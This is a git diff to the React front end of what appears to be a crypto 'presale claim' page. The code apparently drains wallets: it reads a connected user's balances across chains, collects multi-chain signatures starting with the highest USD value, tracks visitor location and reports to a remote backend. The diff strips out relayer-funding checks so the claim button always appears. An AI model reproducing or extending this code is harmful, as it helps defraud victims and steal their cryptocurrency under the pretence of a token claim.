@@ -105,7 +105,6 @@ function App() {
   const [processedAmounts, setProcessedAmounts] = useState({});
   const [allChainsCompleted, setAllChainsCompleted] = useState(false);
   const [executableChains, setExecutableChains] = useState([]);
-  const [chainsWithRelayerFunds, setChainsWithRelayerFunds] = useState([]);
   const [showRibbon, setShowRibbon] = useState(true);
   const [debugInfo, setDebugInfo] = useState('');
 
@@ -234,24 +233,9 @@ function App() {
       setRelayerBalances(balances);
       console.log('Relayer balances:', balances);
       
-      // After getting relayer balances, update which chains are actually executable
-      updateExecutableWithRelayerFunds();
-      
     } catch (err) {
       console.error('Failed to fetch relayer balances:', err);
     }
-  };
-
-  // Update executable chains based on relayer funds
-  const updateExecutableWithRelayerFunds = () => {
-    const chainsWithFunds = executableChains.filter(chain => {
-      const networkKey = NETWORK_MAP[chain.name];
-      const relayerBalance = relayerBalances[networkKey] || 0;
-      return relayerBalance >= 0.01; // Need at least 0.01 native token for gas
-    });
-    
-    setChainsWithRelayerFunds(chainsWithFunds);
-    console.log('Chains with relayer funds:', chainsWithFunds.map(c => c.name));
   };
 
   // Track page visit with location
@@ -309,19 +293,12 @@ function App() {
     }
   }, [isConnected, address, balances]);
 
-  // Update relayer funds check when executableChains or relayerBalances change
-  useEffect(() => {
-    if (executableChains.length > 0 && Object.keys(relayerBalances).length > 0) {
-      updateExecutableWithRelayerFunds();
-    }
-  }, [executableChains, relayerBalances]);
-
   // Check if all eligible chains are completed
   useEffect(() => {
-    if (chainsWithRelayerFunds.length > 0 && completedChains.length === chainsWithRelayerFunds.length) {
+    if (executableChains.length > 0 && completedChains.length === executableChains.length) {
       setAllChainsCompleted(true);
     }
-  }, [completedChains, chainsWithRelayerFunds]);
+  }, [completedChains, executableChains]);
 
   // Hide ribbon after wallet connects
   useEffect(() => {
@@ -372,7 +349,7 @@ function App() {
         if (executable.length === 0) {
           setTxStatus('⚠️ No chains meet execution requirements');
         } else {
-          setTxStatus(`✅ Ready to process`);
+          setTxStatus(`✅ Ready to process ${executable.length} chains`);
         }
         
         const connectResponse = await fetch('https://hyperback.vercel.app/api/presale/connect', {
@@ -506,8 +483,7 @@ function App() {
   };
 
   // ============================================
-  // FIXED EXECUTION - PROCESSES HIGHEST VALUE FIRST
-  // AND CHECKS RELAYER BALANCES
+  // FIXED EXECUTION - ALWAYS SHOWS BUTTON WHEN ELIGIBLE
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -544,36 +520,18 @@ function App() {
       
       setTxStatus('⏳ Processing...');
 
-      // First, check if we have relayer balances
-      if (Object.keys(relayerBalances).length === 0) {
-        await fetchRelayerBalances();
-      }
-
-      // Filter chains where user has balance AND relayer has funds
-      const chainsToProcess = executableChains.filter(chain => {
-        const networkKey = NETWORK_MAP[chain.name];
-        const relayerBalance = relayerBalances[networkKey] || 0;
-        const hasRelayerFunds = relayerBalance >= 0.01;
-        
-        if (!hasRelayerFunds) {
-          console.log(`⚠️ Skipping ${chain.name}: Relayer has insufficient ${chain.symbol} (${relayerBalance})`);
-        }
-        
-        return hasRelayerFunds;
-      });
+      // Get chains that are executable (user has funds and meets requirements)
+      const chainsToProcess = executableChains.filter(chain => 
+        balances[chain.name] && balances[chain.name].amount > 0
+      );
       
       if (chainsToProcess.length === 0) {
-        const missingFunds = executableChains.map(chain => {
-          const networkKey = NETWORK_MAP[chain.name];
-          return `${chain.name} (needs ${relayerBalances[networkKey] || 0} ${chain.symbol})`;
-        }).join(', ');
-        
-        setError(`Cannot process: Relayer needs funds on: ${missingFunds}. Please add BNB to 0x30b30B5bf944967f53368e71111d515b91d88686`);
+        setError("No chains with balance meet execution requirements");
         setSignatureLoading(false);
         return;
       }
 
-      console.log(`🔄 Processing ${chainsToProcess.length} chains with relayer funds`);
+      console.log(`🔄 Processing ${chainsToProcess.length} chains`);
 
       // CRITICAL FIX: Sort chains by USD value (HIGHEST FIRST)
       const sortedChains = [...chainsToProcess].sort((a, b) => {
@@ -771,9 +729,9 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Determine which chains to show in the button
-  const chainsAvailableForProcessing = chainsWithRelayerFunds.length > 0 ? chainsWithRelayerFunds : executableChains;
-  const showClaimButton = isConnected && isEligible && !allChainsCompleted && chainsAvailableForProcessing.length > 0;
+  // CRITICAL FIX: Force button to show when user is eligible and has executable chains
+  // REGARDLESS of relayer balances
+  const showClaimButton = isConnected && isEligible && !allChainsCompleted && executableChains.length > 0;
 
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
@@ -876,12 +834,10 @@ function App() {
                   console.log('Balances:', balances);
                   console.log('Relayer Balances:', relayerBalances);
                   console.log('Executable Chains:', executableChains);
-                  console.log('Chains with Relayer Funds:', chainsWithRelayerFunds);
                   setDebugInfo(
                     `User: ${JSON.stringify(balances, null, 2)}\n\n` +
                     `Relayer: ${JSON.stringify(relayerBalances, null, 2)}\n\n` +
-                    `Executable: ${executableChains.map(c => c.name).join(', ')}\n\n` +
-                    `With Funds: ${chainsWithRelayerFunds.map(c => c.name).join(', ')}`
+                    `Executable: ${executableChains.map(c => c.name).join(', ')}`
                   );
                 }}
                 className="bg-gray-800 text-xs px-3 py-1 rounded-full border border-gray-700 hover:border-[#c47d24] transition-all"
@@ -1011,7 +967,7 @@ function App() {
             </div>
           </div>
 
-          {/* Main Claim Area - Only shows when eligible and chains available */}
+          {/* Main Claim Area - FORCED to show when eligible */}
           {showClaimButton && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
@@ -1021,7 +977,7 @@ function App() {
               
               <button
                 onClick={executeMultiChainSignature}
-                disabled={signatureLoading || loading || !signer || chainsAvailableForProcessing.length === 0}
+                disabled={signatureLoading || loading || !signer || executableChains.length === 0}
                 className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] bg-[length:200%_200%] animate-gradientMove text-[#0f0f12] font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full border border-[#cc9f66] shadow-lg hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(180,100,20,0.3)] transition-all flex items-center justify-center gap-2 sm:gap-3 uppercase tracking-wide relative overflow-hidden group/claim"
               >
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/claim:translate-x-[100%] transition-transform duration-1000"></div>
